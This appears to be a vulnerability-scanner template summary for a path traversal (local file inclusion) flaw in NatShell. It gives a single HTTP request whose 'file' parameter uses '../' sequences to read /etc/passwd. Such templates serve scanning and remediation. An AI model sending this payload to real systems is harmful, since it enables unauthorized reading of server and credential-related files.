# Nuclei Template: NatShell - Local File Inclusion
**Template ID:** natshell-path-traversal
**Vulnerability Class:** Path Traversal
**Severity:** High
**CWE:** CWE-22
**Source:** Nuclei Template (`natshell-path-traversal.yaml`)

## Vulnerability Information & PoC

## Description
NatShell is vulnerable to local file inclusion.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/download.php?file=../../../../../etc/passwd
```

## References
- https://mp.weixin.qq.com/s/g4YNI6UBqIQcKL0TRkKWlw
